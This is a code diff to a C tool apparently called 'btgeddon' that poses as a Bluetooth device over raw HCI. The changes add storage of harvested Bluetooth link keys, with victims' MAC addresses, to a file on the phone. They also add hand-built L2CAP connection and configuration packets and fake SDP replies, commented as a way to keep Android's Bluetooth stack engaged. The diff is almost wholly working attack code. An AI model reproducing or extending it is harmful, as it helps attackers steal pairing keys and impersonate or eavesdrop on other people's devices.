@@ -275,8 +275,24 @@ int main(int argc, char **argv) {
                     uint8_t key_type = rx[25];
                     printf("\033[1;32m[KEY HARVESTED]\033[0m Link Key for %02X:%02X:%02X:%02X:%02X:%02X (Type 0x%02X): \033[1;37m",
                            bd[5], bd[4], bd[3], bd[2], bd[1], bd[0], key_type);
-                    for (int k = 0; k < 16; k++) printf("%02X", key[k]);
+                    char key_hex[33] = {0};
+                    for (int k = 0; k < 16; k++) {
+                        printf("%02X", key[k]);
+                        sprintf(&key_hex[k*2], "%02X", key[k]);
+                    }
                     printf("\033[0m\n");
+
+                    // Persist to /sdcard/btgeddon/harvested_keys.txt
+                    FILE *fk = fopen("/sdcard/btgeddon/harvested_keys.txt", "a");
+                    if (fk) {
+                        time_t now = time(NULL);
+                        char tbuf[32];
+                        strftime(tbuf, sizeof(tbuf), "%Y-%m-%d %H:%M:%S", localtime(&now));
+                        fprintf(fk, "[%s] MAC=%02X:%02X:%02X:%02X:%02X:%02X KEY=%s TYPE=0x%02X PROFILE=\"%s\"\n",
+                                tbuf, bd[5], bd[4], bd[3], bd[2], bd[1], bd[0], key_hex, key_type, name);
+                        fclose(fk);
+                        printf("  \033[1;32m[✓]\033[0m Key saved to /sdcard/btgeddon/harvested_keys.txt\n");
+                    }
                 }
                 else if (evt_code == 0x05 && n >= 7) {
                     // HCI_Disconnection_Complete
@@ -295,8 +311,9 @@ int main(int argc, char **argv) {
                     if (cmd_code == 0x02 && n >= 17) { // L2CAP_CONNECTION_REQ
                         uint16_t psm = rx[13] | (rx[14] << 8);
                         uint16_t scid = rx[15] | (rx[16] << 8);
-                        printf("\033[1;34m[L2CAP CONNECT]\033[0m PSM: 0x%04X (%s) from SCID 0x%04X -> Accepting...\n",
-                               psm, psm==1?"SDP":psm==3?"RFCOMM":psm==23?"AVDTP":"Service", scid);
+                        uint16_t dcid = 0x0040; // Allocate dynamic local CID for this connection
+                        printf("\033[1;34m[L2CAP CONNECT]\033[0m PSM: 0x%04X (%s) from Remote SCID: 0x%04X -> Assigning Local DCID: 0x%04X\n",
+                               psm, psm==1?"SDP":psm==3?"RFCOMM":psm==23?"AVDTP":"Service", scid, dcid);
 
                         uint8_t conn_rsp[] = {
                             0x02,
@@ -308,13 +325,29 @@ int main(int argc, char **argv) {
                             0x03,       // Code: L2CAP_CONNECTION_RSP
                             ident,      // Ident
                             0x04, 0x00, // Payload Length = 4
-                            (uint8_t)(scid & 0xFF), (uint8_t)((scid >> 8) & 0xFF), // DCID
-                            (uint8_t)(scid & 0xFF), (uint8_t)((scid >> 8) & 0xFF), // SCID
+                            (uint8_t)(dcid & 0xFF), (uint8_t)((dcid >> 8) & 0xFF), // DCID (Local)
+                            (uint8_t)(scid & 0xFF), (uint8_t)((scid >> 8) & 0xFF), // SCID (Remote)
                             0x00, 0x00, // Result: Success (0x0000)
                             0x00, 0x00  // Status: No further info
                         };
                         write(fd, conn_rsp, sizeof(conn_rsp));
-                        printf("  \033[1;32m[✓]\033[0m L2CAP Channel 0x%04X Established!\n", scid);
+
+                        // Immediately also send our own L2CAP_CONFIGURATION_REQ to remote SCID to satisfy Android Flouride L2CAP FSM
+                        uint8_t cfg_req[] = {
+                            0x02,
+                            (uint8_t)(handle & 0xFF),
+                            (uint8_t)((handle >> 8) & 0x0F),
+                            0x0C, 0x00, // Total ACL Length = 12
+                            0x08, 0x00, // L2CAP Length = 8
+                            0x01, 0x00, // L2CAP CID = 0x0001
+                            0x04,       // Code: L2CAP_CONFIGURATION_REQ
+                            (uint8_t)(ident + 1), // Ident
+                            0x04, 0x00, // Payload Length = 4
+                            (uint8_t)(scid & 0xFF), (uint8_t)((scid >> 8) & 0xFF), // Destination CID (Remote SCID)
+                            0x00, 0x00  // Flags = 0
+                        };
+                        write(fd, cfg_req, sizeof(cfg_req));
+                        printf("  \033[1;32m[✓]\033[0m L2CAP Channel Established (DCID 0x%04X <-> SCID 0x%04X)\n", dcid, scid);
                     }
                     else if (cmd_code == 0x04 && n >= 15) { // L2CAP_CONFIGURATION_REQ
                         uint16_t dcid = rx[13] | (rx[14] << 8);
@@ -351,6 +384,53 @@ int main(int argc, char **argv) {
                             0x80, 0x02, 0x00, 0x00 // Extended Features Mask
                         };
                         write(fd, info_rsp, sizeof(info_rsp));
+                    }
+                }
+                else if ((l2cap_cid == 0x0040 || l2cap_cid >= 0x0040) && n >= 14) {
+                    // SDP or Service Protocol Channel Data Packet
+                    uint8_t sdp_pdu = rx[9];
+                    uint16_t trans_id = (rx[10] << 8) | rx[11];
+                    uint16_t param_len = (rx[12] << 8) | rx[13];
+                    printf("\033[1;36m[SDP QUERY]\033[0m PDU: 0x%02X (TransID: 0x%04X, Len: %u) -> Replying Synthetic Record...\n",
+                           sdp_pdu, trans_id, param_len);
+
+                    if (sdp_pdu == 0x02) { // SDP_ServiceSearchRequest
+                        // Reply with 1 matching service handle: 0x00010001
+                        uint8_t sdp_rsp[] = {
+                            0x02,
+                            (uint8_t)(handle & 0xFF),
+                            (uint8_t)((handle >> 8) & 0x0F),
+                            0x11, 0x00, // Total ACL Length = 17
+                            0x0D, 0x00, // L2CAP Length = 13
+                            (uint8_t)(l2cap_cid & 0xFF), (uint8_t)((l2cap_cid >> 8) & 0xFF),
+                            0x03,       // PDU: SDP_ServiceSearchResponse
+                            (uint8_t)(trans_id >> 8), (uint8_t)(trans_id & 0xFF),
+                            0x00, 0x08, // Parameter Length = 8
+                            0x00, 0x01, // Total Service Record Count = 1
+                            0x00, 0x01, // Current Service Record Count = 1
+                            0x00, 0x01, 0x00, 0x01, // ServiceRecordHandle = 0x00010001
+                            0x00        // Continuation State = 0
+                        };
+                        write(fd, sdp_rsp, sizeof(sdp_rsp));
+                    }
+                    else if (sdp_pdu == 0x04 || sdp_pdu == 0x06) {
+                        // SDP_ServiceAttributeRequest or SDP_ServiceSearchAttributeRequest
+                        // Return empty attribute list or valid empty sequence (0x35 0x00) with 0 continuation state
+                        uint8_t sdp_rsp[] = {
+                            0x02,
+                            (uint8_t)(handle & 0xFF),
+                            (uint8_t)((handle >> 8) & 0x0F),
+                            0x0F, 0x00, // Total ACL Length = 15
+                            0x0B, 0x00, // L2CAP Length = 11
+                            (uint8_t)(l2cap_cid & 0xFF), (uint8_t)((l2cap_cid >> 8) & 0xFF),
+                            (uint8_t)(sdp_pdu + 1), // Response PDU (0x05 or 0x07)
+                            (uint8_t)(trans_id >> 8), (uint8_t)(trans_id & 0xFF),
+                            0x00, 0x06, // Parameter Length = 6
+                            0x00, 0x02, // AttributeListByteCount = 2
+                            0x35, 0x00, // Empty Data Element Sequence (DES 0 bytes)
+                            0x00        // Continuation State = 0 (no more data)
+                        };
+                        write(fd, sdp_rsp, sizeof(sdp_rsp));
                     }
                 }
             }
